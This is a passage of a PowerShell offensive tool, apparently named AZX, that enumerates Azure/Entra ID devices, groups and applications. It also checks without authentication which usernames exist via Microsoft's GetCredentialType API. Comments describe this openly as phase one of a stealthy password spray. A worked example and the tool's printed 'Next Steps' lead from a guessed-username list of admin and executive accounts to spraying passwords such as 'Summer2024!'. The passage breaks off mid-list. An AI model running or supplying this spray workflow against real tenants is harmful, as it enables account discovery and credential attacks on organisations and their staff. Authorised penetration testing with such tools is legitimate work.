function Get-FilteredDevices {
    param(
        [array]$Devices,
        [string]$Filter
    )
    
    switch ($Filter) {
        "windows" {
            return $Devices | Where-Object { $_.OperatingSystem -like "Windows*" }
        }
        "azuread" {
            return $Devices | Where-Object { $_.TrustType -eq "AzureAd" }
        }
        "hybrid" {
            return $Devices | Where-Object { $_.TrustType -eq "ServerAd" }
        }
        "compliant" {
            return $Devices | Where-Object { $_.IsCompliant -eq $true }
        }
        "noncompliant" {
            return $Devices | Where-Object { $_.IsCompliant -eq $false }
        }
        "disabled" {
            return $Devices | Where-Object { $_.AccountEnabled -eq $false }
        }
        default {
            return $Devices
        }
    }
}

# Main host enumeration function
function Invoke-HostEnumeration {
    param(
        [string]$Filter,
        [bool]$ShowOwners,
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Enumeration Tool" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Host Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Filter: $Filter`n" -Color "Yellow"
    
    # Get all devices
    Write-ColorOutput -Message "[*] Retrieving devices from Azure/Entra ID..." -Color "Yellow"
    
    try {
        $allDevices = Get-MgDevice -All -ErrorAction Stop
        Write-ColorOutput -Message "[+] Retrieved $($allDevices.Count) total devices`n" -Color "Green"
    } catch {
        Write-ColorOutput -Message "[!] Failed to retrieve devices: $_" -Color "Red"
        Write-ColorOutput -Message "[!] Ensure you have Device.Read.All permissions" -Color "Red"
        return
    }
    
    # Apply filter
    $devices = Get-FilteredDevices -Devices $allDevices -Filter $Filter
    
    if ($devices.Count -eq 0) {
        Write-ColorOutput -Message "[!] No devices found matching filter: $Filter" -Color "Red"
        return
    }
    
    Write-ColorOutput -Message "[*] Displaying $($devices.Count) devices after filtering`n" -Color "Green"
    
    # Prepare export data
    $exportData = @()
    
    # Enumerate devices
    foreach ($device in $devices) {
        $owner = $null
        if ($ShowOwners) {
            $owner = Get-DeviceOwners -DeviceId $device.Id
        }
        
        Format-DeviceOutput -Device $device -Owner $owner
        
        # Collect for export
        if ($ExportPath) {
            $exportData += [PSCustomObject]@{
                DeviceId             = $device.DeviceId
                DisplayName          = $device.DisplayName
                OperatingSystem      = $device.OperatingSystem
                OperatingSystemVersion = $device.OperatingSystemVersion
                TrustType            = $device.TrustType
                IsCompliant          = $device.IsCompliant
                AccountEnabled       = $device.AccountEnabled
                ApproximateLastSignInDateTime = $device.ApproximateLastSignInDateTime
                RegisteredOwners     = $owner
            }
        }
    }
    
    # Calculate summary statistics
    $windowsCount = ($devices | Where-Object { $_.OperatingSystem -like "Windows*" }).Count
    $azureAdCount = ($devices | Where-Object { $_.TrustType -eq "AzureAd" }).Count
    $hybridCount = ($devices | Where-Object { $_.TrustType -eq "ServerAd" }).Count
    $compliantCount = ($devices | Where-Object { $_.IsCompliant -eq $true }).Count
    $enabledCount = ($devices | Where-Object { $_.AccountEnabled -eq $true }).Count
    
    # Export if requested
    if ($ExportPath) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".csv") {
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".json") {
                $exportData | ConvertTo-Json -Depth 5 | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".html") {
                $stats = [ordered]@{
                    "Total Devices" = $devices.Count
                    "Windows Devices" = $windowsCount
                    "Azure Entra ID Joined" = $azureAdCount
                    "Hybrid Joined" = $hybridCount
                    "Compliant Devices" = $compliantCount
                    "Enabled Devices" = $enabledCount
                }
                
                $description = "Comprehensive device enumeration from Azure/Entra ID. Filter applied: $Filter"
                
                $success = Export-HtmlReport -Data $exportData -OutputPath $ExportPath -Title "Device Enumeration Report" -Statistics $stats -CommandName "hosts" -Description $description
                
                if ($success) {
                    Write-ColorOutput -Message "`n[+] HTML report exported to: $ExportPath" -Color "Green"
                }
            } else {
                # Default to CSV
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            }
        } catch {
            Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    Write-ColorOutput -Message "`n[*] Enumeration complete!" -Color "Green"
    
    # Display summary statistics
    Write-ColorOutput -Message "`n[*] Summary:" -Color "Yellow"
    Write-ColorOutput -Message "    Total Devices: $($devices.Count)" -Color "Cyan"
    Write-ColorOutput -Message "    Windows Devices: $windowsCount" -Color "Cyan"
    Write-ColorOutput -Message "    Azure Entra ID Joined: $azureAdCount" -Color "Cyan"
    Write-ColorOutput -Message "    Hybrid Joined: $hybridCount" -Color "Cyan"
    Write-ColorOutput -Message "    Compliant: $compliantCount" -Color "Cyan"
    Write-ColorOutput -Message "    Enabled: $enabledCount" -Color "Cyan"
}

# Common usernames list
function Get-CommonUsernames {
    param(
        [string]$Domain
    )
    
    # Common username patterns
    $commonNames = @(
        # Administrative accounts
        "admin",
        "administrator",
        "root",
        "sysadmin",
        "sa",
        "sql",
        "dba",
        "dbadmin",
        "dbmanager",
        "dbowner",
        "dbroot",
        "dbadmin",
        "dbmanager",
        "dbowner",
        "dbroot",
        
        # Support and helpdesk
        "support",
        "helpdesk",
        "servicedesk",
        "itadmin",
        "itsupport",
        "ithelp",
        "ithelper",
        
        # Security and compliance
        "security",
        "cybersecurity",
        "infosec",
        "secops",
        "dpo",
        "compliance",
        "privacy",
        "privacyofficer",
        
        # Business departments
        "accounting",
        "finance",
        "billing",
        "payroll",
        "invoices",
        "accounts",
        "hr",
        "humanresources",
        "recruitment",
        "sales",
        "marketing",
        "legal",
        "contracts",
        "contractsmanager",        
        
        # Communications
        "info",
        "contact",
        "hello",
        "noreply",
        "no-reply",
        "donotreply",
        "mailer",
        "postmaster",
        "webmaster",
        "notifications",
        "alerts",
        "social",
        "supportemail",
        
        # Web and portal accounts
        "webadmin",
        "webmail",
        "portal",
        "mail",
        "smtp",
        "imap",
        "help",
        
        # IT and operations
        "it",
        "dev",
        "developer",
        "ops",
        "devops",
        "sysops",
        "operations",
        "infrastructure",
        "network",
        "monitoring",
        "logs",
        "logging",
        "internal",
        "intranet",        
        
        # Service accounts
        "service",
        "backup",
        "reports",
        "reporting",
        "automation",
        "api",
        "webhook",
        
        # Testing and demo
        "test",
        "testing",
        "demo",
        "guest",
        "user",
        "users",
        
        # Executive accounts
        "ceo",
        "cfo",
        "cto",
        "cio",
        "cso",
        "ciso"
    )
    
    # Generate usernames with domain
    $usernames = @()
    foreach ($name in $commonNames) {
        $usernames += "$name@$Domain"
    }
    
    return $usernames
}

# Check username existence using GetCredentialType API
# ============================================
# PASSWORD SPRAY ATTACK WORKFLOW
# ============================================
# This function is Phase 1 of a two-phase password spray attack:
#
# PHASE 1: Username Enumeration (this function, called by 'users' command)
#   - Uses Microsoft's public GetCredentialType API
#   - No authentication required
#   - Does NOT trigger authentication logs (stealthy!)
#   - Validates which usernames exist in the tenant
#   - Returns authentication type (Managed/Federated/Alternate)
#
# PHASE 2: Password Spraying (Test-GuestAuthentication function, called by 'guest' command)
#   - Uses ROPC (Resource Owner Password Credentials) OAuth2 flow
#   - Tests actual username/password combinations
#   - Detects MFA requirements, account lockouts, password expiration
#   - Generates authentication logs (moderate stealth)
#
# WHY TWO PHASES?
#   1. GetCredentialType only validates usernames (not passwords)
#   2. Spraying only validated usernames reduces account lockout risk
#   3. Separating enumeration from auth testing improves OPSEC
#   4. Can test 100s of usernames quickly without triggering alerts
#
# EXAMPLE WORKFLOW:
#   Step 1: .\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath valid-users.csv
#   Step 2: $validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
#   Step 3: $validUsers | Out-File spray-targets.txt
#   Step 4: .\azx.ps1 guest -Domain target.com -UserFile spray-targets.txt -Password 'Summer2024!' -ExportPath spray-results.json
#
# ============================================
function Test-UsernameExistence {
    param(
        [string]$Username
    )
    
    try {
        $body = @{
            username = $Username
        } | ConvertTo-Json
        
        $response = Invoke-RestMethod `
            -Method POST `
            -Uri "https://login.microsoftonline.com/common/GetCredentialType" `
            -ContentType "application/json" `
            -Body $body `
            -ErrorAction Stop
        
        # Parse response
        $result = [PSCustomObject]@{
            Username = $Username
            Exists = $false
            IfExistsResult = $null
            ThrottleStatus = $null
            EstsProperties = $null
        }
        
        # IfExistsResult values:
        # 0 = User exists
        # 1 = User does not exist
        # 5 = User exists (different authentication)
        # 6 = User exists (federated)
        
        if ($response.IfExistsResult -ne $null) {
            $result.IfExistsResult = $response.IfExistsResult
            
            if ($response.IfExistsResult -eq 0 -or 
                $response.IfExistsResult -eq 5 -or 
                $response.IfExistsResult -eq 6) {
                $result.Exists = $true
            }
        }
        
        $result.ThrottleStatus = $response.ThrottleStatus
        $result.EstsProperties = $response.EstsProperties
        
        return $result
        
    } catch {
        # If we get an error, return null to indicate the check failed
        return $null
    }
}

# Format username enumeration output like netexec
function Format-UsernameOutput {
    param(
        [string]$Domain,
        [string]$Username,
        [PSCustomObject]$Result
    )
    
    if ($null -eq $Result) {
        # Check failed (network error, etc.)
        $output = "AZR".PadRight(12) + 
                  $Domain.PadRight(35) + 
                  "443".PadRight(7) + 
                  $Username.PadRight(38) + 
                  "[!] Check failed"
        Write-ColorOutput -Message $output -Color "Red"
        return
    }
    
    # Format output
    $username = $Result.Username
    $maxUsernameLength = 35
    $displayUsername = if ($username.Length -gt $maxUsernameLength) {
        $username.Substring(0, $maxUsernameLength - 3) + "..."
    } else {
        $username
    }
    
    if ($Result.Exists) {
        # User exists
        $status = switch ($Result.IfExistsResult) {
            0 { "[+] Valid username (Managed)" }
            5 { "[+] Valid username (Alternate auth)" }
            6 { "[+] Valid username (Federated)" }
            default { "[+] Valid username" }
        }
        
        $output = "AZR".PadRight(12) + 
                  $Domain.PadRight(35) + 
                  "443".PadRight(7) + 
                  $displayUsername.PadRight(38) + 
                  $status
        
        Write-ColorOutput -Message $output -Color "Green"
    } else {
        # User does not exist
        $output = "AZR".PadRight(12) + 
                  $Domain.PadRight(35) + 
                  "443".PadRight(7) + 
                  $displayUsername.PadRight(38) + 
                  "[-] Invalid username"
        
        Write-ColorOutput -Message $output -Color "DarkGray"
    }
}

# Main user enumeration function
function Invoke-UserEnumeration {
    param(
        [string]$Domain,
        [string]$Username,
        [string]$UserFile,
        [bool]$CommonUsernames,
        [string]$ExportPath
    )
    
    # Validate that at least one input method is provided
    if (-not $Username -and -not $UserFile -and -not $CommonUsernames) {
        Write-ColorOutput -Message "[!] Please provide one of: -Username, -UserFile, or -CommonUsernames" -Color "Red"
        Write-ColorOutput -Message "[*] Examples (domain is optional and will be auto-detected if not provided):" -Color "Yellow"
        Write-ColorOutput -Message "    .\azx.ps1 users -Username alice@example.com" -Color "Yellow"
        Write-ColorOutput -Message "    .\azx.ps1 users -CommonUsernames" -Color "Yellow"
        Write-ColorOutput -Message "    .\azx.ps1 users -Domain example.com -UserFile users.txt" -Color "Yellow"
        return
    }
    
    # Auto-detect domain if not provided
    if (-not $Domain) {
        Write-ColorOutput -Message "[*] No domain specified, attempting to auto-detect..." -Color "Yellow"
        
        $detectedDomain = $null
        
        try {
            if ($IsWindows -or $PSVersionTable.PSVersion.Major -le 5) {
                $upn = whoami /upn 2>$null
                if ($upn -and $upn -match '@(.+)$') {
                    $detectedDomain = $matches[1]
                }
            }
            
            if (-not $detectedDomain) {
                $envDomain = [System.Environment]::GetEnvironmentVariable("USERDNSDOMAIN")
                if ($envDomain) {
                    $detectedDomain = $envDomain
                }
            }
        } catch {
            # Silent catch
        }
        
        if ($detectedDomain) {
            $Domain = $detectedDomain
            Write-ColorOutput -Message "[+] Using auto-detected domain: $Domain`n" -Color "Green"
        } else {
            Write-ColorOutput -Message "[!] Could not auto-detect domain" -Color "Red"
            Write-ColorOutput -Message "[!] Please provide the domain using: -Domain example.com" -Color "Yellow"
            return
        }
    }
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Username Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Target Domain: $Domain" -Color "Yellow"
    Write-ColorOutput -Message "[*] Method: GetCredentialType API (No authentication required)`n" -Color "Yellow"
    
    # Build username list
    $usernames = @()
    
    if ($Username) {
        # Single username
        # If username doesn't contain @, append domain
        if ($Username -notlike "*@*") {
            $Username = "$Username@$Domain"
        }
        $usernames += $Username
        Write-ColorOutput -Message "[*] Checking single username: $Username`n" -Color "Yellow"
    }
    
    if ($UserFile) {
        # Read from file
        if (-not (Test-Path $UserFile)) {
            Write-ColorOutput -Message "[!] User file not found: $UserFile" -Color "Red"
            return
        }
        
        try {
            $fileUsernames = Get-Content $UserFile -ErrorAction Stop
            foreach ($user in $fileUsernames) {
                $user = $user.Trim()
                if ($user -and $user -notlike "#*") {  # Skip empty lines and comments
                    # If username doesn't contain @, append domain
                    if ($user -notlike "*@*") {
                        $user = "$user@$Domain"
                    }
                    $usernames += $user
                }
            }
            Write-ColorOutput -Message "[*] Loaded $($usernames.Count) usernames from file: $UserFile`n" -Color "Green"
        } catch {
            Write-ColorOutput -Message "[!] Failed to read user file: $_" -Color "Red"
            return
        }
    }
    
    if ($CommonUsernames) {
        # Use common usernames
        $commonUsers = Get-CommonUsernames -Domain $Domain
        $usernames += $commonUsers
        Write-ColorOutput -Message "[*] Using $($commonUsers.Count) common usernames`n" -Color "Yellow"
    }
    
    if ($usernames.Count -eq 0) {
        Write-ColorOutput -Message "[!] No usernames to check" -Color "Red"
        return
    }
    
    Write-ColorOutput -Message "[*] Checking $($usernames.Count) username(s)...`n" -Color "Yellow"
    
    # Check each username with progress indicator
    $results = @()
    $validUsers = @()
    $checkedCount = 0
    $failedCount = 0
    $startTime = Get-Date
    
    # Track auth types for statistics
    $authTypeStats = @{
        Managed = 0
        Federated = 0
        Alternate = 0
        Unknown = 0
    }
    
    foreach ($user in $usernames) {
        # Show progress for large lists (>10 users)
        if ($usernames.Count -gt 10) {
            $percentComplete = [math]::Round(($checkedCount / $usernames.Count) * 100)
            $elapsed = (Get-Date) - $startTime
            $estimatedTotal = if ($checkedCount -gt 0) { 
                $elapsed.TotalSeconds * ($usernames.Count / $checkedCount) 
            } else { 0 }
            $remaining = $estimatedTotal - $elapsed.TotalSeconds
            
            Write-Progress -Activity "Username Enumeration" `
                -Status "Checking $($checkedCount + 1)/$($usernames.Count): $user" `
                -PercentComplete $percentComplete `
                -SecondsRemaining ([math]::Max(0, $remaining))
        }
        
        # Test username with retry logic
        $result = $null
        $maxRetries = 3
        $retryCount = 0
        
        while ($retryCount -lt $maxRetries -and $null -eq $result) {
            $result = Test-UsernameExistence -Username $user
            
            if ($null -eq $result -and $retryCount -lt ($maxRetries - 1)) {
                # Exponential backoff: 100ms, 200ms, 400ms
                $backoffMs = 100 * [math]::Pow(2, $retryCount)
                Start-Sleep -Milliseconds $backoffMs
                $retryCount++
            } else {
                break
            }
        }
        
        Format-UsernameOutput -Domain $Domain -Username $user -Result $result
        
        if ($result) {
            if ($result.Exists) {
                $validUsers += $result
                
                # Track auth type statistics
                $authType = switch ($result.IfExistsResult) {
                    0 { "Managed" }
                    5 { "Alternate" }
                    6 { "Federated" }
                    default { "Unknown" }
                }
                $authTypeStats[$authType]++
            }
            $results += $result
        } else {
            $failedCount++
            # Still add to results for export
            $results += [PSCustomObject]@{
                Username = $user
                Exists = $false
                IfExistsResult = $null
                ThrottleStatus = $null
                EstsProperties = $null
                Error = "Failed after $maxRetries retries"
            }
        }
        
        $checkedCount++
        
        # Adaptive delay: faster for small lists, slower for large lists to avoid throttling
        $delayMs = if ($usernames.Count -lt 50) { 50 } 
                   elseif ($usernames.Count -lt 200) { 100 }
                   else { 150 }
        Start-Sleep -Milliseconds $delayMs
    }
    
    # Clear progress bar
    if ($usernames.Count -gt 10) {
        Write-Progress -Activity "Username Enumeration" -Completed
    }
    
    # Calculate duration
    $duration = (Get-Date) - $startTime
    $durationStr = "{0:mm}m {0:ss}s" -f $duration
    
    # Summary with enhanced statistics
    Write-ColorOutput -Message "`n[*] Username enumeration complete!" -Color "Green"
    Write-ColorOutput -Message "`n[*] Summary:" -Color "Yellow"
    Write-ColorOutput -Message "    Total Checked:   $checkedCount" -Color "Cyan"
    Write-ColorOutput -Message "    Valid Users:     $($validUsers.Count)" -Color "Green"
    Write-ColorOutput -Message "    Invalid Users:   $($checkedCount - $validUsers.Count - $failedCount)" -Color "DarkGray"
    if ($failedCount -gt 0) {
        Write-ColorOutput -Message "    Failed Checks:   $failedCount" -Color "Red"
    }
    Write-ColorOutput -Message "    Duration:        $durationStr" -Color "Cyan"
    Write-ColorOutput -Message "    Rate:            $([math]::Round($checkedCount / $duration.TotalSeconds, 2)) checks/sec" -Color "Cyan"
    
    # Auth type breakdown
    if ($validUsers.Count -gt 0) {
        Write-ColorOutput -Message "`n[*] Authentication Type Breakdown:" -Color "Yellow"
        if ($authTypeStats['Managed'] -gt 0) {
            Write-ColorOutput -Message "    Managed:    $($authTypeStats['Managed'])" -Color "Green"
        }
        if ($authTypeStats['Federated'] -gt 0) {
            Write-ColorOutput -Message "    Federated:  $($authTypeStats['Federated'])" -Color "Green"
        }
        if ($authTypeStats['Alternate'] -gt 0) {
            Write-ColorOutput -Message "    Alternate:  $($authTypeStats['Alternate'])" -Color "Green"
        }
        if ($authTypeStats['Unknown'] -gt 0) {
            Write-ColorOutput -Message "    Unknown:    $($authTypeStats['Unknown'])" -Color "Yellow"
        }
    }
    
    # Export if requested
    if ($ExportPath) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            $exportData = @()
            foreach ($result in $results) {
                if ($result) {
                    $exportData += [PSCustomObject]@{
                        Username = $result.Username
                        Exists = $result.Exists
                        IfExistsResult = $result.IfExistsResult
                        AuthType = switch ($result.IfExistsResult) {
                            0 { "Managed" }
                            5 { "Alternate" }
                            6 { "Federated" }
                            default { "Unknown" }
                        }
                        ThrottleStatus = $result.ThrottleStatus
                        Error = if ($result.PSObject.Properties['Error']) { $result.Error } else { $null }
                    }
                }
            }
            
            if ($extension -eq ".csv") {
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".json") {
                $exportData | ConvertTo-Json -Depth 5 | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".html") {
                $stats = [ordered]@{
                    "Total Checked" = $results.Count
                    "Valid Usernames" = $validUsers.Count
                    "Managed Auth" = ($validUsers | Where-Object { $_.IfExistsResult -eq 0 }).Count
                    "Federated Auth" = ($validUsers | Where-Object { $_.IfExistsResult -eq 6 }).Count
                    "Invalid Usernames" = ($results | Where-Object { $_.Exists -eq $false }).Count
                }
                
                $description = "Username enumeration results for domain: $Domain. This phase validates username existence without authentication."
                
                $success = Export-HtmlReport -Data $exportData -OutputPath $ExportPath -Title "Username Enumeration Report" -Statistics $stats -CommandName "users" -Description $description
                
                if ($success) {
                    Write-ColorOutput -Message "`n[+] HTML report exported to: $ExportPath" -Color "Green"
                }
            } else {
                # Default to CSV
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            }
        } catch {
            Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    # Display valid usernames
    if ($validUsers.Count -gt 0) {
        Write-ColorOutput -Message "`n[*] Valid Usernames Found:" -Color "Green"
        foreach ($validUser in $validUsers) {
            $authType = switch ($validUser.IfExistsResult) {
                0 { "Managed" }
                5 { "Alternate" }
                6 { "Federated" }
                default { "Unknown" }
            }
            Write-ColorOutput -Message "    [+] $($validUser.Username) ($authType)" -Color "Green"
        }
        
        # Security tip for password spraying
        Write-ColorOutput -Message "`n[*] Next Steps:" -Color "Yellow"
        Write-ColorOutput -Message "    To perform password spraying with these valid users:" -Color "Cyan"
        if ($ExportPath) {
            Write-ColorOutput -Message "    1. Extract valid users: `$users = Import-Csv '$ExportPath' | Where { `$_.Exists -eq 'True' } | Select -ExpandProperty Username" -Color "Cyan"
            Write-ColorOutput -Message "    2. Save to file: `$users | Out-File spray-targets.txt" -Color "Cyan"
            Write-ColorOutput -Message "    3. Run spray: .\azx.ps1 guest -Domain $Domain -UserFile spray-targets.txt -Password 'YourPassword123!'" -Color "Cyan"
        } else {
            Write-ColorOutput -Message "    .\azx.ps1 guest -Domain $Domain -Username <username> -Password 'YourPassword123!'" -Color "Cyan"
        }
    }
}

# Format group output like netexec
function Format-GroupOutput {
    param(
        [PSCustomObject]$Group,
        [int]$MemberCount = 0
    )
    
    # Group name
    $groupName = if ($Group.DisplayName) { $Group.DisplayName } else { "UNKNOWN" }
    
    # Truncate long group names for column display
    $maxNameLength = 35
    $displayName = if ($groupName.Length -gt $maxNameLength) {
        $groupName.Substring(0, $maxNameLength - 3) + "..."
    } else {
        $groupName
    }
    
    # Use group ID as "IP" equivalent (first 15 chars for alignment)
    $groupIdShort = if ($Group.Id) { 
        $Group.Id.Substring(0, [Math]::Min(15, $Group.Id.Length))
    } else { 
        "UNKNOWN-ID" 
    }
    
    # Group type and security status
    $groupTypes = if ($Group.GroupTypes -and $Group.GroupTypes.Count -gt 0) {
        $Group.GroupTypes -join ","
    } else {
        "Security"
    }
    
    $securityEnabled = if ($Group.SecurityEnabled) { "True" } else { "False" }
    $mailEnabled = if ($Group.MailEnabled) { "True" } else { "False" }
    
    # Description
    $description = if ($Group.Description) { 
        if ($Group.Description.Length -gt 50) {
            $Group.Description.Substring(0, 47) + "..."
        } else {
            $Group.Description
        }
    } else { 
        "No description" 
    }
    
    # Check if this is a privileged/administrative group based on name
    $privilegedKeywords = @(
        "admin", "administrator", "admins",
        "global", "privileged", "security",
        "domain admins", "enterprise admins",
        "root", "sudo", "wheel",
        "helpdesk", "tier", "pim"
    )
    
    $isPrivilegedGroup = $false
    foreach ($keyword in $privilegedKeywords) {
        if ($groupName -match $keyword) {
            $isPrivilegedGroup = $true
            break
        }
    }
    
    $output = "AZR".PadRight(12) + 
              $groupIdShort.PadRight(17) + 
              "443".PadRight(7) + 
              $displayName.PadRight(38) + 
              "[*] (name:$groupName) (type:$groupTypes) (security:$securityEnabled) (mail:$mailEnabled) (members:$MemberCount) (desc:$description)"
    
    # Color based on privilege level and type
    $color = "Cyan"
    if ($isPrivilegedGroup -and $Group.SecurityEnabled) {
        $color = "Red"  # Privileged security groups in red (highest priority)
    } elseif ($Group.SecurityEnabled) {
        $color = "Green"  # Security groups in green
    } elseif ($Group.MailEnabled) {
        $color = "Yellow"  # Mail-enabled groups in yellow
    }
    
    Write-ColorOutput -Message $output -Color $color
}

# Get group member count
function Get-GroupMemberCount {
    param(
        [string]$GroupId
    )
    
    try {
        $members = Get-MgGroupMember -GroupId $GroupId -ErrorAction SilentlyContinue
        if ($members) {
            return $members.Count
        }
    } catch {
        return 0
    }
    
    return 0
}

# Main group enumeration function
function Invoke-GroupEnumeration {
    param(
        [bool]$ShowMembers,
        [string]$ExportPath
    )
    
    Write-ColorOutput -Message "`n[*] AZX - Azure/Entra Group Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: Group Enumeration" -Color "Yellow"
    Write-ColorOutput -Message "[*] Similar to: nxc smb --groups`n" -Color "Yellow"
    
    # Get all groups
    Write-ColorOutput -Message "[*] Retrieving groups from Azure/Entra ID..." -Color "Yellow"
    
    try {
        $allGroups = Get-MgGroup -All -ErrorAction Stop
        Write-ColorOutput -Message "[+] Retrieved $($allGroups.Count) total groups`n" -Color "Green"
    } catch {
        Write-ColorOutput -Message "[!] Failed to retrieve groups: $_" -Color "Red"
        Write-ColorOutput -Message "[!] Ensure you have Group.Read.All or Directory.Read.All permissions" -Color "Red"
        Write-ColorOutput -Message "[*] Guest users may have restricted access to group enumeration" -Color "Yellow"
        return
    }
    
    if ($allGroups.Count -eq 0) {
        Write-ColorOutput -Message "[!] No groups found or insufficient permissions" -Color "Red"
        return
    }
    
    Write-ColorOutput -Message "[*] Displaying $($allGroups.Count) groups`n" -Color "Green"
    
    # Prepare export data
    $exportData = @()
    
    # Enumerate groups
    foreach ($group in $allGroups) {
        $memberCount = 0
        if ($ShowMembers) {
            $memberCount = Get-GroupMemberCount -GroupId $group.Id
        }
        
        Format-GroupOutput -Group $group -MemberCount $memberCount
        
        # Collect for export
        if ($ExportPath) {
            $exportData += [PSCustomObject]@{
                GroupId          = $group.Id
                DisplayName      = $group.DisplayName
                Description      = $group.Description
                GroupTypes       = ($group.GroupTypes -join ",")
                SecurityEnabled  = $group.SecurityEnabled
                MailEnabled      = $group.MailEnabled
                Mail             = $group.Mail
                MailNickname     = $group.MailNickname
                CreatedDateTime  = $group.CreatedDateTime
                MemberCount      = $memberCount
            }
        }
    }
    
    # Calculate summary statistics
    $securityGroups = ($allGroups | Where-Object { $_.SecurityEnabled -eq $true }).Count
    $mailEnabledGroups = ($allGroups | Where-Object { $_.MailEnabled -eq $true }).Count
    $unifiedGroups = ($allGroups | Where-Object { $_.GroupTypes -contains "Unified" }).Count
    $dynamicGroups = ($allGroups | Where-Object { $_.GroupTypes -contains "DynamicMembership" }).Count
    
    # Export if requested
    if ($ExportPath) {
        try {
            $extension = [System.IO.Path]::GetExtension($ExportPath).ToLower()
            
            if ($extension -eq ".csv") {
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".json") {
                $exportData | ConvertTo-Json -Depth 5 | Out-File -FilePath $ExportPath -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            } elseif ($extension -eq ".html") {
                $stats = [ordered]@{
                    "Total Groups" = $allGroups.Count
                    "Security Groups" = $securityGroups
                    "Mail-Enabled Groups" = $mailEnabledGroups
                    "Microsoft 365 Groups" = $unifiedGroups
                    "Dynamic Groups" = $dynamicGroups
                }
                
                $description = "Comprehensive group enumeration from Azure/Entra ID including security groups, M365 groups, and distribution lists."
                
                $success = Export-HtmlReport -Data $exportData -OutputPath $ExportPath -Title "Group Enumeration Report" -Statistics $stats -CommandName "groups" -Description $description
                
                if ($success) {
                    Write-ColorOutput -Message "`n[+] HTML report exported to: $ExportPath" -Color "Green"
                }
            } else {
                # Default to CSV
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation -Force
                Write-ColorOutput -Message "`n[+] Results exported to: $ExportPath" -Color "Green"
            }
        } catch {
            Write-ColorOutput -Message "`n[!] Failed to export results: $_" -Color "Red"
        }
    }
    
    Write-ColorOutput -Message "`n[*] Group enumeration complete!" -Color "Green"
    
    # Display summary statistics
    Write-ColorOutput -Message "`n[*] Summary:" -Color "Yellow"
    Write-ColorOutput -Message "    Total Groups: $($allGroups.Count)" -Color "Cyan"
    Write-ColorOutput -Message "    Security Groups: $securityGroups" -Color "Cyan"
    Write-ColorOutput -Message "    Mail-Enabled Groups: $mailEnabledGroups" -Color "Cyan"
    Write-ColorOutput -Message "    Microsoft 365 Groups: $unifiedGroups" -Color "Cyan"
    Write-ColorOutput -Message "    Dynamic Groups: $dynamicGroups" -Color "Cyan"
}

# Format application output like netexec
function Format-ApplicationOutput {
    param(
        [PSCustomObject]$Application,
        [string]$AppType = "Application",
        [array]$HighRiskPermissions = @()
    )
    
    # Application name
    $appName = if ($Application.DisplayName) { $Application.DisplayName } else { "UNKNOWN" }
    
    # Truncate long app names for column display
    $maxNameLength = 35
    $displayName = if ($appName.Length -gt $maxNameLength) {
        $appName.Substring(0, $maxNameLength - 3) + "..."
    } else {
        $appName
    }
    
    # Use app ID as "IP" equivalent (first 15 chars for alignment)
    $appIdShort = if ($Application.AppId) { 
        $Application.AppId.Substring(0, [Math]::Min(15, $Application.AppId.Length))
    } else { 
        "UNKNOWN-ID" 
    }
    
    # Credential status - check for password vs certificate credentials
    $credStatus = "None"
    $credCount = 0
    
    if ($Application.PasswordCredentials -and $Application.PasswordCredentials.Count -gt 0) {
        $credCount += $Application.PasswordCredentials.Count
        if ($Application.KeyCredentials -and $Application.KeyCredentials.Count -gt 0) {
            $credStatus = "Both"
        } else {
            $credStatus = "Password"
        }
    } elseif ($Application.KeyCredentials -and $Application.KeyCredentials.Count -gt 0) {
        $credCount += $Application.KeyCredentials.Count
        $credStatus = "Certificate"
    }
    
    # Sign-in audience
    $audience = if ($Application.SignInAudience) { 
        $Application.SignInAudience 
    } else { 
        "N/A" 
    }
    
    # Public client status (ROPC vulnerable)
    $isPublicClient = if ($Application.IsFallbackPublicClient -eq $true) {
        "True"
    } elseif ($Application.PublicClient -and $Application.PublicClient.RedirectUris.Count -gt 0) {
        "True"
    } else {
        "False"
    }
    
    # Check for high-risk permissions in requiredResourceAccess
    $hasHighRiskPermissions = $false
    if ($HighRiskPermissions.Count -gt 0 -and $Application.RequiredResourceAccess) {
        foreach ($resource in $Application.RequiredResourceAccess) {
            if ($resource.ResourceAppId -eq "00000003-0000-0000-c000-000000000000") {  # Microsoft Graph
                foreach ($access in $resource.ResourceAccess) {
                    # Get permission value/name from a common mapping
                    $permId = $access.Id
                    # Check common high-risk permission IDs
                    $highRiskPermIds = @(
                        "19dbc75e-c2e2-444c-a770-ec69d8559fc7",  # Directory.ReadWrite.All
                        "1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9",  # Application.ReadWrite.All
